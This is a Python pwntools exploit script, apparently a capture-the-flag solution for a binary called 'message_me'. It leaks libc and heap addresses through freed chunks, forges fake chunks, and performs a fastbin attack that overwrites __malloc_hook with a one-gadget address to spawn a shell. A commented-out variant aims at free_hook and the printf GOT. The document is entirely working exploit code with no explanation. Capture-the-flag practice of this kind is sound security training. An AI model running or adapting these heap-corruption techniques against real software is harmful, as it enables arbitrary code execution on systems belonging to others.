from pwn import *

binary = ELF("message_me")

def add(size, content):
	p.sendlineafter("choice : ", "0")
	p.sendlineafter("Give me the message size : ", str(size))
	p.sendafter("Give me your meesage : ", content)

def remove(idx):
        p.sendlineafter("choice : ", "1")
	p.sendlineafter("Give me index of the message : ", str(idx))

def show(idx):
	global mtime, msg
        p.sendlineafter("choice : ", "2")
        p.sendlineafter("Give me index of the message : ", str(idx))
	p.recvuntil("Time : ")
	mtime = p.recvuntil("Message : ").split("Message : ")[0]
	msg = p.recvline()[:-1]

def change(idx):
        p.sendlineafter("choice : ", "3")
        p.sendlineafter("Give me index of the message : ", str(idx))


p = process("./message_me")
msg = ""
add(0x80, "0"*0x10)
add(0x80, "1"*0x10)
add(0x80, "2"*0x10)

show(0)
remove(0)
show(0)
leak = u64(msg.ljust(8,"\x00"))
libc = leak - 0x3c4b78
log.info("leak : 0x%x" % leak)
log.info("libc : 0x%x" % libc)

remove(2)
show(0)
leak = u64(msg.ljust(8,"\x00"))
heap = leak - 0x120
log.info("leak : 0x%x" % leak)
log.info("heap : 0x%x" % heap)


fake_chunk = "\x00"*0xd
fake_chunk += p64(0x61)
fake_chunk += "\x00"*0x10
fake_chunk += "7"*0x10

add(0x50, "3"*0x10)
add(0x50, "4"*0x10)
add(0x50, "5"*0x10)
add(0x50, "6"*0x10)
add(0x50, fake_chunk)
payload = "8"*0x40
payload += "\x00"*14 + "\x61"
add(0x60, payload)

remove(7)
remove(5)

#to_write = 0x6020e0
#calc_idx = (to_write - 0x6020C0) / 8

for i in range(6):
	change(5)
remove(8)

free_hook = libc + 0x3c67a8
malloc_hook = libc + 0x3c4b10
target = malloc_hook - 0x20 - 3
log.info("target : 0x%x"%target)
add(0x50, "aaaa")
payload = "\x00"*(0x40-13)
payload += p64(0x71)
payload += p64(target)
add(0x50, payload)
add(0x60, "xxxxx")
pause()
one_shot = libc + 0xf02a4
payload = "\x00"*11
payload += p64(one_shot)
add(0x60, payload)
remove(5)
remove(5)

"""
free_hook = libc + 0x3c67a8
payload = "\x00" * 2
payload += p64(0x1031)
payload += p64(binary.got["printf"]-8)
payload += p64(binary.got["printf"]-16)
add(0x50, payload)

target = free_hook - 0x10 - 3 
payload = "b"*13
payload += "\x00"*0x20
payload += p64(0x71)
payload += p64(target)
add(0x50, "aaaaa")
add(0x50, payload)
add(0x60, "aaaaa")
"""
p.interactive()
